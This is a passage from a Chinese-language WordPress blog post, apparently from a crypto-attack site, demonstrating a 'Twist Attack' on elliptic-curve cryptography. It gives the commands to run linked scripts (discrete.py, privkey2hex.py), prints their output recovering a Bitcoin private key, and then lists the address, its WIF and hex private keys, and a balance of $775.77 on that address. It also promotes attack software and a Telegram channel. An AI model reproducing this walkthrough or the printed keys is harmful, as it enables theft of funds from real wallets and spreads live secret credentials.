<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>要求解離散對數，<em><code>(Pollard's rho algorithm for logarithms)</code></em>請運行<code>Python-script:</code>&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/bbd83042e7405508cd2e646ad1b0819da0f9c58d/18TwistAttack/discrete.py" target="_blank" rel="noreferrer noopener">discrete.py</a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":2210} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-35-1024x520.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2210"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>運行命令：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sage -python3 discrete.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2214} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-36.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2214"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>結果：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Discrete_log_rho:
5663673254
229
19231
43549
11713353
47161820
13016
6068
1461826
5248038982
9034433903442

PRIVATE KEY:
4843137891892877119728403798088723017104154997204069979961743654961499092503</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>privkey = crt(&#91;x11, x21, x22, x31, x32, x33, x41, x61, x62, x63, x64], &#91;ord11, ord21, ord22, ord31, ord32, ord33, ord41, ord61, ord62, ord63, ord64])
</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>我們解決了離散對數並使用“<em>中國剩餘定理</em>&nbsp;<code>(Chinese remainder theorem)</code>”得到了十進制格式的私鑰。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading -->
<h2>將私鑰轉換為 HEX 格式</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><em>私鑰的十進制格式已保存到文件中：</em>&nbsp;<code>privkey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":2227} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-37.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2227"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>運行 Python 腳本：<a href="https://github.com/demining/CryptoDeepTools/blob/main/18TwistAttack/privkey2hex.py" target="_blank" rel="noreferrer noopener">privkey2hex.py</a></h2>
<!-- /wp:heading -->

<!-- wp:image {"id":2230} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-38.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2230"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 privkey2hex.py
cat privkey2hex.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2231} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-39.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2231"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><em>讓我們打開生成的文件：</em>&nbsp;<code>privkey2hex.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2235} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-40.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2235"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>十六進制格式的私鑰：</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>PrivKey = 0ab51e7092866dadf86165ea0d70beb69086237a0e7f5a123d496d3d98e03617</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>讓我們打開&nbsp;<strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a></strong>&nbsp;並檢查：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq
WIF:  KwaXPrvbWF5USy3GCh453UDGWXnBSroiKKtE6ebtmHHxGKaRmVD6
HEX:  0AB51E7092866DADF86165EA0D70BEB69086237A0E7F5A123D496D3D98E03617</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":2248} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-41-1.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2248"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://live.blockcypher.com/widget/btc/1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq/received/"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://live.blockcypher.com/widget/btc/1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq/received/
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://live.blockcypher.com/btc/address/1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq/"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://live.blockcypher.com/btc/address/1J7TUsfVc58ao6qYjcUhzKW1LxxiZ57vCq/
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2253} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-42-1024x528.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2253"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":2257} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-43-1024x179.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2257"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code><strong>BALANCE: $ 775.77</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/18TwistAttack" target="_blank" rel="noreferrer noopener">來源</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://attacksafe.ru/software" target="_blank" rel="noreferrer noopener">攻擊安全軟件</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">電報：https://t.me/cryptodeeptech</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://youtu.be/S_ZUcM2cD8I" target="_blank" rel="noreferrer noopener">視頻素材：https://youtu.be/S_ZUcM2cD8I</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/twist-attack" target="_blank" rel="noreferrer noopener">資料來源：https://cryptodeep.ru/twist-attack</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2053} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/031-1024x576.png" alt="Twist Attack 示例 #1 執行一系列 ECC 操作以獲取比特幣錢包私鑰的值" class="wp-image-2053"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/">密碼分析</a></p>
<!-- /wp:paragraph -->
